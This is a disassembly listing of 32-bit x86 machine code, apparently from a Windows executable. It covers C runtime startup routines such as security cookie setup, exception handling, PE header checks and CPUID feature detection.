  401e1e:	3b cf                	cmp    %edi,%ecx
  401e20:	75 07                	jne    0x401e29
  401e22:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
  401e27:	eb 10                	jmp    0x401e39
  401e29:	85 ce                	test   %ecx,%esi
  401e2b:	75 0c                	jne    0x401e39
  401e2d:	8b c1                	mov    %ecx,%eax
  401e2f:	0d 11 47 00 00       	or     $0x4711,%eax
  401e34:	c1 e0 10             	shl    $0x10,%eax
  401e37:	0b c8                	or     %eax,%ecx
  401e39:	89 0d 04 30 41 00    	mov    %ecx,0x413004
  401e3f:	f7 d1                	not    %ecx
  401e41:	89 0d 00 30 41 00    	mov    %ecx,0x413000
  401e47:	5f                   	pop    %edi
  401e48:	5e                   	pop    %esi
  401e49:	8b e5                	mov    %ebp,%esp
  401e4b:	5d                   	pop    %ebp
  401e4c:	c3                   	ret
  401e4d:	33 c0                	xor    %eax,%eax
  401e4f:	40                   	inc    %eax
  401e50:	c3                   	ret
  401e51:	b8 00 40 00 00       	mov    $0x4000,%eax
  401e56:	c3                   	ret
  401e57:	33 c0                	xor    %eax,%eax
  401e59:	c3                   	ret
  401e5a:	68 c0 3a 41 00       	push   $0x413ac0
  401e5f:	ff 15 94 c0 40 00    	call   *0x40c094
  401e65:	c3                   	ret
  401e66:	68 00 00 03 00       	push   $0x30000
  401e6b:	68 00 00 01 00       	push   $0x10000
  401e70:	6a 00                	push   $0x0
  401e72:	e8 fb 1e 00 00       	call   0x403d72
  401e77:	83 c4 0c             	add    $0xc,%esp
  401e7a:	85 c0                	test   %eax,%eax
  401e7c:	75 01                	jne    0x401e7f
  401e7e:	c3                   	ret
  401e7f:	6a 07                	push   $0x7
  401e81:	e8 42 00 00 00       	call   0x401ec8
  401e86:	cc                   	int3
  401e87:	b8 c8 3a 41 00       	mov    $0x413ac8,%eax
  401e8c:	c3                   	ret
  401e8d:	b8 d0 3a 41 00       	mov    $0x413ad0,%eax
  401e92:	c3                   	ret
  401e93:	e8 ef ff ff ff       	call   0x401e87
  401e98:	8b 48 04             	mov    0x4(%eax),%ecx
  401e9b:	83 08 04             	orl    $0x4,(%eax)
  401e9e:	89 48 04             	mov    %ecx,0x4(%eax)
  401ea1:	e8 e7 ff ff ff       	call   0x401e8d
  401ea6:	8b 48 04             	mov    0x4(%eax),%ecx
  401ea9:	83 08 02             	orl    $0x2,(%eax)
  401eac:	89 48 04             	mov    %ecx,0x4(%eax)
  401eaf:	c3                   	ret
  401eb0:	33 c0                	xor    %eax,%eax
  401eb2:	39 05 0c 30 41 00    	cmp    %eax,0x41300c
  401eb8:	0f 94 c0             	sete   %al
  401ebb:	c3                   	ret
  401ebc:	b8 98 42 41 00       	mov    $0x414298,%eax
  401ec1:	c3                   	ret
  401ec2:	b8 94 42 41 00       	mov    $0x414294,%eax
  401ec7:	c3                   	ret
  401ec8:	55                   	push   %ebp
  401ec9:	8b ec                	mov    %esp,%ebp
  401ecb:	81 ec 24 03 00 00    	sub    $0x324,%esp
  401ed1:	53                   	push   %ebx
  401ed2:	56                   	push   %esi
  401ed3:	6a 17                	push   $0x17
  401ed5:	e8 d2 89 00 00       	call   0x40a8ac
  401eda:	85 c0                	test   %eax,%eax
  401edc:	74 05                	je     0x401ee3
  401ede:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401ee1:	cd 29                	int    $0x29
  401ee3:	33 f6                	xor    %esi,%esi
  401ee5:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  401eeb:	68 cc 02 00 00       	push   $0x2cc
  401ef0:	56                   	push   %esi
  401ef1:	50                   	push   %eax
  401ef2:	89 35 d8 3a 41 00    	mov    %esi,0x413ad8
  401ef8:	e8 13 06 00 00       	call   0x402510
  401efd:	83 c4 0c             	add    $0xc,%esp
  401f00:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  401f06:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
  401f0c:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
  401f12:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
  401f18:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
  401f1e:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  401f24:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
  401f2b:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
  401f32:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
  401f39:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
  401f40:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
  401f47:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
  401f4e:	9c                   	pushf
  401f4f:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
  401f55:	8b 45 04             	mov    0x4(%ebp),%eax
  401f58:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  401f5e:	8d 45 04             	lea    0x4(%ebp),%eax
  401f61:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  401f67:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
  401f6e:	00 01 00 
  401f71:	8b 40 fc             	mov    -0x4(%eax),%eax
  401f74:	6a 50                	push   $0x50
  401f76:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  401f7c:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401f7f:	56                   	push   %esi
  401f80:	50                   	push   %eax
  401f81:	e8 8a 05 00 00       	call   0x402510
  401f86:	8b 45 04             	mov    0x4(%ebp),%eax
  401f89:	83 c4 0c             	add    $0xc,%esp
  401f8c:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
  401f93:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  401f9a:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401f9d:	ff 15 98 c0 40 00    	call   *0x40c098
  401fa3:	56                   	push   %esi
  401fa4:	8d 58 ff             	lea    -0x1(%eax),%ebx
  401fa7:	f7 db                	neg    %ebx
  401fa9:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401fac:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401faf:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  401fb5:	1a db                	sbb    %bl,%bl
  401fb7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401fba:	fe c3                	inc    %bl
  401fbc:	ff 15 78 c0 40 00    	call   *0x40c078
  401fc2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401fc5:	50                   	push   %eax
  401fc6:	ff 15 74 c0 40 00    	call   *0x40c074
  401fcc:	85 c0                	test   %eax,%eax
  401fce:	75 0d                	jne    0x401fdd
  401fd0:	0f b6 c3             	movzbl %bl,%eax
  401fd3:	f7 d8                	neg    %eax
  401fd5:	1b c0                	sbb    %eax,%eax
  401fd7:	21 05 d8 3a 41 00    	and    %eax,0x413ad8
  401fdd:	5e                   	pop    %esi
  401fde:	5b                   	pop    %ebx
  401fdf:	8b e5                	mov    %ebp,%esp
  401fe1:	5d                   	pop    %ebp
  401fe2:	c3                   	ret
  401fe3:	cc                   	int3
  401fe4:	55                   	push   %ebp
  401fe5:	8b ec                	mov    %esp,%ebp
  401fe7:	83 ec 44             	sub    $0x44,%esp
  401fea:	6a 44                	push   $0x44
  401fec:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401fef:	6a 00                	push   $0x0
  401ff1:	50                   	push   %eax
  401ff2:	e8 19 05 00 00       	call   0x402510
  401ff7:	83 c4 0c             	add    $0xc,%esp
  401ffa:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401ffd:	50                   	push   %eax
  401ffe:	ff 15 9c c0 40 00    	call   *0x40c09c
  402004:	f6 45 e8 01          	testb  $0x1,-0x18(%ebp)
  402008:	74 06                	je     0x402010
  40200a:	0f b7 45 ec          	movzwl -0x14(%ebp),%eax
  40200e:	eb 03                	jmp    0x402013
  402010:	6a 0a                	push   $0xa
  402012:	58                   	pop    %eax
  402013:	8b e5                	mov    %ebp,%esp
  402015:	5d                   	pop    %ebp
  402016:	c3                   	ret
  402017:	6a 00                	push   $0x0
  402019:	ff 15 a0 c0 40 00    	call   *0x40c0a0
  40201f:	8b c8                	mov    %eax,%ecx
  402021:	85 c9                	test   %ecx,%ecx
  402023:	75 03                	jne    0x402028
  402025:	32 c0                	xor    %al,%al
  402027:	c3                   	ret
  402028:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  40202d:	66 39 01             	cmp    %ax,(%ecx)
  402030:	75 f3                	jne    0x402025
  402032:	8b 41 3c             	mov    0x3c(%ecx),%eax
  402035:	03 c1                	add    %ecx,%eax
  402037:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  40203d:	75 e6                	jne    0x402025
  40203f:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  402044:	66 39 48 18          	cmp    %cx,0x18(%eax)
  402048:	75 db                	jne    0x402025
  40204a:	83 78 74 0e          	cmpl   $0xe,0x74(%eax)
  40204e:	76 d5                	jbe    0x402025
  402050:	83 b8 e8 00 00 00 00 	cmpl   $0x0,0xe8(%eax)
  402057:	0f 95 c0             	setne  %al
  40205a:	c3                   	ret
  40205b:	68 67 20 40 00       	push   $0x402067
  402060:	ff 15 78 c0 40 00    	call   *0x40c078
  402066:	c3                   	ret
  402067:	55                   	push   %ebp
  402068:	8b ec                	mov    %esp,%ebp
  40206a:	8b 45 08             	mov    0x8(%ebp),%eax
  40206d:	8b 00                	mov    (%eax),%eax
  40206f:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  402075:	75 25                	jne    0x40209c
  402077:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40207b:	75 1f                	jne    0x40209c
  40207d:	8b 40 14             	mov    0x14(%eax),%eax
  402080:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  402085:	74 1b                	je     0x4020a2
  402087:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  40208c:	74 14                	je     0x4020a2
  40208e:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  402093:	74 0d                	je     0x4020a2
  402095:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  40209a:	74 06                	je     0x4020a2
  40209c:	33 c0                	xor    %eax,%eax
  40209e:	5d                   	pop    %ebp
  40209f:	c2 04 00             	ret    $0x4
  4020a2:	e8 2a 1d 00 00       	call   0x403dd1
  4020a7:	cc                   	int3
  4020a8:	83 25 d8 3a 41 00 00 	andl   $0x0,0x413ad8
  4020af:	c3                   	ret
  4020b0:	53                   	push   %ebx
  4020b1:	56                   	push   %esi
  4020b2:	be d0 16 41 00       	mov    $0x4116d0,%esi
  4020b7:	bb d0 16 41 00       	mov    $0x4116d0,%ebx
  4020bc:	3b f3                	cmp    %ebx,%esi
  4020be:	73 18                	jae    0x4020d8
  4020c0:	57                   	push   %edi
  4020c1:	8b 3e                	mov    (%esi),%edi
  4020c3:	85 ff                	test   %edi,%edi
  4020c5:	74 09                	je     0x4020d0
  4020c7:	8b cf                	mov    %edi,%ecx
  4020c9:	e8 38 00 00 00       	call   0x402106
  4020ce:	ff d7                	call   *%edi
  4020d0:	83 c6 04             	add    $0x4,%esi
  4020d3:	3b f3                	cmp    %ebx,%esi
  4020d5:	72 ea                	jb     0x4020c1
  4020d7:	5f                   	pop    %edi
  4020d8:	5e                   	pop    %esi
  4020d9:	5b                   	pop    %ebx
  4020da:	c3                   	ret
  4020db:	53                   	push   %ebx
  4020dc:	56                   	push   %esi
  4020dd:	be d8 16 41 00       	mov    $0x4116d8,%esi
  4020e2:	bb d8 16 41 00       	mov    $0x4116d8,%ebx
  4020e7:	3b f3                	cmp    %ebx,%esi
  4020e9:	73 18                	jae    0x402103
  4020eb:	57                   	push   %edi
  4020ec:	8b 3e                	mov    (%esi),%edi
  4020ee:	85 ff                	test   %edi,%edi
  4020f0:	74 09                	je     0x4020fb
  4020f2:	8b cf                	mov    %edi,%ecx
  4020f4:	e8 0d 00 00 00       	call   0x402106
  4020f9:	ff d7                	call   *%edi
  4020fb:	83 c6 04             	add    $0x4,%esi
  4020fe:	3b f3                	cmp    %ebx,%esi
  402100:	72 ea                	jb     0x4020ec
  402102:	5f                   	pop    %edi
  402103:	5e                   	pop    %esi
  402104:	5b                   	pop    %ebx
  402105:	c3                   	ret
  402106:	ff 25 60 c1 40 00    	jmp    *0x40c160
  40210c:	cc                   	int3
  40210d:	cc                   	int3
  40210e:	cc                   	int3
  40210f:	cc                   	int3
  402110:	68 60 23 40 00       	push   $0x402360
  402115:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40211c:	8b 44 24 10          	mov    0x10(%esp),%eax
  402120:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  402124:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  402128:	2b e0                	sub    %eax,%esp
  40212a:	53                   	push   %ebx
  40212b:	56                   	push   %esi
  40212c:	57                   	push   %edi
  40212d:	a1 04 30 41 00       	mov    0x413004,%eax
  402132:	31 45 fc             	xor    %eax,-0x4(%ebp)
  402135:	33 c5                	xor    %ebp,%eax
  402137:	50                   	push   %eax
  402138:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40213b:	ff 75 f8             	push   -0x8(%ebp)
  40213e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402141:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402148:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40214b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40214e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402154:	f2 c3                	bnd ret
  402156:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402159:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402160:	59                   	pop    %ecx
  402161:	5f                   	pop    %edi
  402162:	5f                   	pop    %edi
  402163:	5e                   	pop    %esi
  402164:	5b                   	pop    %ebx
  402165:	8b e5                	mov    %ebp,%esp
  402167:	5d                   	pop    %ebp
  402168:	51                   	push   %ecx
  402169:	f2 c3                	bnd ret
  40216b:	55                   	push   %ebp
  40216c:	8b ec                	mov    %esp,%ebp
  40216e:	83 25 dc 3a 41 00 00 	andl   $0x0,0x413adc
  402175:	83 ec 2c             	sub    $0x2c,%esp
  402178:	53                   	push   %ebx
  402179:	33 db                	xor    %ebx,%ebx
  40217b:	43                   	inc    %ebx
  40217c:	09 1d 10 30 41 00    	or     %ebx,0x413010
  402182:	6a 0a                	push   $0xa
  402184:	e8 23 87 00 00       	call   0x40a8ac
  402189:	85 c0                	test   %eax,%eax
  40218b:	0f 84 77 01 00 00    	je     0x402308
  402191:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  402195:	33 c0                	xor    %eax,%eax
  402197:	83 0d 10 30 41 00 02 	orl    $0x2,0x413010
  40219e:	33 c9                	xor    %ecx,%ecx
  4021a0:	56                   	push   %esi
  4021a1:	57                   	push   %edi
  4021a2:	89 1d dc 3a 41 00    	mov    %ebx,0x413adc
  4021a8:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  4021ab:	53                   	push   %ebx
  4021ac:	0f a2                	cpuid
  4021ae:	8b f3                	mov    %ebx,%esi
  4021b0:	5b                   	pop    %ebx
  4021b1:	89 07                	mov    %eax,(%edi)
  4021b3:	89 77 04             	mov    %esi,0x4(%edi)
  4021b6:	89 4f 08             	mov    %ecx,0x8(%edi)
  4021b9:	33 c9                	xor    %ecx,%ecx
  4021bb:	89 57 0c             	mov    %edx,0xc(%edi)
  4021be:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4021c1:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4021c4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021c7:	81 f7 47 65 6e 75    	xor    $0x756e6547,%edi
  4021cd:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4021d0:	35 69 6e 65 49       	xor    $0x49656e69,%eax
  4021d5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021d8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4021db:	35 6e 74 65 6c       	xor    $0x6c65746e,%eax
  4021e0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021e3:	33 c0                	xor    %eax,%eax
  4021e5:	40                   	inc    %eax
  4021e6:	53                   	push   %ebx
  4021e7:	0f a2                	cpuid
  4021e9:	8b f3                	mov    %ebx,%esi
  4021eb:	5b                   	pop    %ebx
  4021ec:	0b 7d fc             	or     -0x4(%ebp),%edi
  4021ef:	8d 5d d4             	lea    -0x2c(%ebp),%ebx
  4021f2:	0b 7d f8             	or     -0x8(%ebp),%edi
  4021f5:	89 03                	mov    %eax,(%ebx)
  4021f7:	89 73 04             	mov    %esi,0x4(%ebx)
  4021fa:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4021fd:	89 53 0c             	mov    %edx,0xc(%ebx)
  402200:	75 43                	jne    0x402245
  402202:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402205:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
  40220a:	3d c0 06 01 00       	cmp    $0x106c0,%eax
  40220f:	74 23                	je     0x402234
  402211:	3d 60 06 02 00       	cmp    $0x20660,%eax
  402216:	74 1c                	je     0x402234
  402218:	3d 70 06 02 00       	cmp    $0x20670,%eax
  40221d:	74 15                	je     0x402234
  40221f:	3d 50 06 03 00       	cmp    $0x30650,%eax
  402224:	74 0e                	je     0x402234
  402226:	3d 60 06 03 00       	cmp    $0x30660,%eax
  40222b:	74 07                	je     0x402234
  40222d:	3d 70 06 03 00       	cmp    $0x30670,%eax
  402232:	75 11                	jne    0x402245
  402234:	8b 3d e0 3a 41 00    	mov    0x413ae0,%edi
  40223a:	83 cf 01             	or     $0x1,%edi
  40223d:	89 3d e0 3a 41 00    	mov    %edi,0x413ae0
  402243:	eb 06                	jmp    0x40224b
  402245:	8b 3d e0 3a 41 00    	mov    0x413ae0,%edi
  40224b:	83 7d f4 07          	cmpl   $0x7,-0xc(%ebp)
  40224f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402252:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402255:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402258:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40225b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40225e:	7c 32                	jl     0x402292
  402260:	6a 07                	push   $0x7
  402262:	58                   	pop    %eax
  402263:	33 c9                	xor    %ecx,%ecx
  402265:	53                   	push   %ebx
  402266:	0f a2                	cpuid
  402268:	8b f3                	mov    %ebx,%esi
  40226a:	5b                   	pop    %ebx
  40226b:	8d 5d d4             	lea    -0x2c(%ebp),%ebx
  40226e:	89 03                	mov    %eax,(%ebx)
  402270:	89 73 04             	mov    %esi,0x4(%ebx)
  402273:	89 4b 08             	mov    %ecx,0x8(%ebx)
  402276:	89 53 0c             	mov    %edx,0xc(%ebx)
  402279:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40227c:	a9 00 02 00 00       	test   $0x200,%eax
  402281:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402284:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402287:	74 09                	je     0x402292
  402289:	83 cf 02             	or     $0x2,%edi
  40228c:	89 3d e0 3a 41 00    	mov    %edi,0x413ae0
  402292:	5f                   	pop    %edi
  402293:	5e                   	pop    %esi
  402294:	a9 00 00 10 00       	test   $0x100000,%eax
  402299:	74 6d                	je     0x402308
  40229b:	83 0d 10 30 41 00 04 	orl    $0x4,0x413010
  4022a2:	c7 05 dc 3a 41 00 02 	movl   $0x2,0x413adc
  4022a9:	00 00 00 
  4022ac:	a9 00 00 00 08       	test   $0x8000000,%eax
  4022b1:	74 55                	je     0x402308
  4022b3:	a9 00 00 00 10       	test   $0x10000000,%eax
  4022b8:	74 4e                	je     0x402308
  4022ba:	33 c9                	xor    %ecx,%ecx
  4022bc:	0f 01 d0             	xgetbv
  4022bf:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4022c2:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4022c5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4022c8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4022cb:	83 e0 06             	and    $0x6,%eax
  4022ce:	33 c9                	xor    %ecx,%ecx
  4022d0:	83 f8 06             	cmp    $0x6,%eax
  4022d3:	75 33                	jne    0x402308
  4022d5:	85 c9                	test   %ecx,%ecx
  4022d7:	75 2f                	jne    0x402308
  4022d9:	a1 10 30 41 00       	mov    0x413010,%eax
  4022de:	83 c8 08             	or     $0x8,%eax
  4022e1:	c7 05 dc 3a 41 00 03 	movl   $0x3,0x413adc
  4022e8:	00 00 00 
  4022eb:	f6 45 ec 20          	testb  $0x20,-0x14(%ebp)
  4022ef:	a3 10 30 41 00       	mov    %eax,0x413010
  4022f4:	74 12                	je     0x402308
  4022f6:	83 c8 20             	or     $0x20,%eax
  4022f9:	c7 05 dc 3a 41 00 05 	movl   $0x5,0x413adc
  402300:	00 00 00 
  402303:	a3 10 30 41 00       	mov    %eax,0x413010
  402308:	33 c0                	xor    %eax,%eax
  40230a:	5b                   	pop    %ebx
  40230b:	8b e5                	mov    %ebp,%esp
  40230d:	5d                   	pop    %ebp
  40230e:	c3                   	ret
  40230f:	33 c0                	xor    %eax,%eax
  402311:	39 05 90 42 41 00    	cmp    %eax,0x414290
  402317:	0f 95 c0             	setne  %al
  40231a:	c3                   	ret
  40231b:	cc                   	int3
  40231c:	cc                   	int3
  40231d:	cc                   	int3
  40231e:	cc                   	int3
  40231f:	cc                   	int3
  402320:	55                   	push   %ebp
  402321:	8b ec                	mov    %esp,%ebp
  402323:	56                   	push   %esi
  402324:	8b 75 08             	mov    0x8(%ebp),%esi
  402327:	57                   	push   %edi
  402328:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40232b:	8b 06                	mov    (%esi),%eax
  40232d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  402330:	74 0d                	je     0x40233f
  402332:	8b 4e 04             	mov    0x4(%esi),%ecx
  402335:	03 cf                	add    %edi,%ecx
  402337:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40233a:	e8 89 f4 ff ff       	call   0x4017c8
  40233f:	8b 46 08             	mov    0x8(%esi),%eax
  402342:	8b 4e 0c             	mov    0xc(%esi),%ecx
  402345:	03 cf                	add    %edi,%ecx
  402347:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40234a:	5f                   	pop    %edi
  40234b:	5e                   	pop    %esi
  40234c:	5d                   	pop    %ebp
  40234d:	e9 76 f4 ff ff       	jmp    0x4017c8
  402352:	cc                   	int3
  402353:	cc                   	int3
  402354:	cc                   	int3
  402355:	cc                   	int3
  402356:	cc                   	int3
  402357:	cc                   	int3
  402358:	cc                   	int3
  402359:	cc                   	int3
  40235a:	cc                   	int3
  40235b:	cc                   	int3
  40235c:	cc                   	int3
  40235d:	cc                   	int3
  40235e:	cc                   	int3
  40235f:	cc                   	int3
  402360:	55                   	push   %ebp
  402361:	8b ec                	mov    %esp,%ebp
  402363:	83 ec 1c             	sub    $0x1c,%esp
  402366:	53                   	push   %ebx
  402367:	56                   	push   %esi
  402368:	8b 75 0c             	mov    0xc(%ebp),%esi
  40236b:	57                   	push   %edi
  40236c:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  402370:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  402377:	8b 5e 08             	mov    0x8(%esi),%ebx
  40237a:	8d 46 10             	lea    0x10(%esi),%eax
  40237d:	33 1d 04 30 41 00    	xor    0x413004,%ebx
  402383:	50                   	push   %eax
  402384:	53                   	push   %ebx
  402385:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402388:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40238b:	e8 90 ff ff ff       	call   0x402320
  402390:	8b 7d 10             	mov    0x10(%ebp),%edi
  402393:	57                   	push   %edi
  402394:	e8 35 04 00 00       	call   0x4027ce
  402399:	8b 45 08             	mov    0x8(%ebp),%eax
  40239c:	83 c4 0c             	add    $0xc,%esp
  40239f:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  4023a3:	0f 85 ba 00 00 00    	jne    0x402463
  4023a9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4023ac:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4023af:	89 7d e8             	mov    %edi,-0x18(%ebp)
  4023b2:	8b 7e 0c             	mov    0xc(%esi),%edi
  4023b5:	89 46 fc             	mov    %eax,-0x4(%esi)
  4023b8:	83 ff fe             	cmp    $0xfffffffe,%edi
  4023bb:	0f 84 c9 00 00 00    	je     0x40248a
  4023c1:	8d 47 02             	lea    0x2(%edi),%eax
  4023c4:	8d 04 47             	lea    (%edi,%eax,2),%eax
  4023c7:	8b 4c 83 04          	mov    0x4(%ebx,%eax,4),%ecx
  4023cb:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  4023ce:	8b 18                	mov    (%eax),%ebx
  4023d0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4023d3:	85 c9                	test   %ecx,%ecx
  4023d5:	74 65                	je     0x40243c
  4023d7:	8d 56 10             	lea    0x10(%esi),%edx
  4023da:	e8 8f 03 00 00       	call   0x40276e
  4023df:	b1 01                	mov    $0x1,%cl
  4023e1:	88 4d ff             	mov    %cl,-0x1(%ebp)
  4023e4:	85 c0                	test   %eax,%eax
  4023e6:	78 66                	js     0x40244e
  4023e8:	7e 55                	jle    0x40243f
  4023ea:	8b 45 08             	mov    0x8(%ebp),%eax
  4023ed:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4023f3:	75 37                	jne    0x40242c
  4023f5:	83 3d 9c 42 41 00 00 	cmpl   $0x0,0x41429c
  4023fc:	74 2e                	je     0x40242c
  4023fe:	68 9c 42 41 00       	push   $0x41429c
  402403:	e8 08 85 00 00       	call   0x40a910
  402408:	83 c4 04             	add    $0x4,%esp
  40240b:	85 c0                	test   %eax,%eax
  40240d:	74 1a                	je     0x402429
  40240f:	8b 35 9c 42 41 00    	mov    0x41429c,%esi
  402415:	8b ce                	mov    %esi,%ecx
  402417:	6a 01                	push   $0x1
  402419:	ff 75 08             	push   0x8(%ebp)
  40241c:	e8 e5 fc ff ff       	call   0x402106
  402421:	ff d6                	call   *%esi
  402423:	8b 75 0c             	mov    0xc(%ebp),%esi
  402426:	83 c4 08             	add    $0x8,%esp
  402429:	8b 45 08             	mov    0x8(%ebp),%eax
  40242c:	8b d0                	mov    %eax,%edx
  40242e:	8b ce                	mov    %esi,%ecx
  402430:	e8 69 03 00 00       	call   0x40279e
  402435:	39 7e 0c             	cmp    %edi,0xc(%esi)
  402438:	74 6c                	je     0x4024a6
  40243a:	eb 58                	jmp    0x402494
  40243c:	8a 4d ff             	mov    -0x1(%ebp),%cl
  40243f:	8b fb                	mov    %ebx,%edi
  402441:	83 fb fe             	cmp    $0xfffffffe,%ebx
  402444:	74 14                	je     0x40245a
  402446:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  402449:	e9 73 ff ff ff       	jmp    0x4023c1
  40244e:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  402451:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  402458:	eb 24                	jmp    0x40247e
  40245a:	84 c9                	test   %cl,%cl
  40245c:	74 2c                	je     0x40248a
  40245e:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  402461:	eb 1b                	jmp    0x40247e
  402463:	83 7e 0c fe          	cmpl   $0xfffffffe,0xc(%esi)
  402467:	74 21                	je     0x40248a
  402469:	68 04 30 41 00       	push   $0x413004
  40246e:	8d 46 10             	lea    0x10(%esi),%eax
  402471:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  402476:	50                   	push   %eax
  402477:	8b ce                	mov    %esi,%ecx
  402479:	e8 39 03 00 00       	call   0x4027b7
  40247e:	ff 75 ec             	push   -0x14(%ebp)
  402481:	53                   	push   %ebx
  402482:	e8 99 fe ff ff       	call   0x402320
  402487:	83 c4 08             	add    $0x8,%esp
  40248a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40248d:	5f                   	pop    %edi
  40248e:	5e                   	pop    %esi
  40248f:	5b                   	pop    %ebx
  402490:	8b e5                	mov    %ebp,%esp
  402492:	5d                   	pop    %ebp
  402493:	c3                   	ret
  402494:	68 04 30 41 00       	push   $0x413004
  402499:	8d 46 10             	lea    0x10(%esi),%eax
  40249c:	8b d7                	mov    %edi,%edx
  40249e:	50                   	push   %eax
  40249f:	8b ce                	mov    %esi,%ecx
  4024a1:	e8 11 03 00 00       	call   0x4027b7
  4024a6:	89 5e 0c             	mov    %ebx,0xc(%esi)
  4024a9:	8d 5e 10             	lea    0x10(%esi),%ebx
  4024ac:	53                   	push   %ebx
  4024ad:	ff 75 f8             	push   -0x8(%ebp)
  4024b0:	e8 6b fe ff ff       	call   0x402320
  4024b5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4024b8:	83 c4 08             	add    $0x8,%esp
  4024bb:	8b d3                	mov    %ebx,%edx
  4024bd:	8b 49 08             	mov    0x8(%ecx),%ecx
  4024c0:	e8 c0 02 00 00       	call   0x402785
  4024c5:	cc                   	int3
  4024c6:	e8 5d 06 00 00       	call   0x402b28
  4024cb:	e8 ec 05 00 00       	call   0x402abc
  4024d0:	e8 64 03 00 00       	call   0x402839
  4024d5:	84 c0                	test   %al,%al
  4024d7:	75 03                	jne    0x4024dc
  4024d9:	32 c0                	xor    %al,%al
  4024db:	c3                   	ret
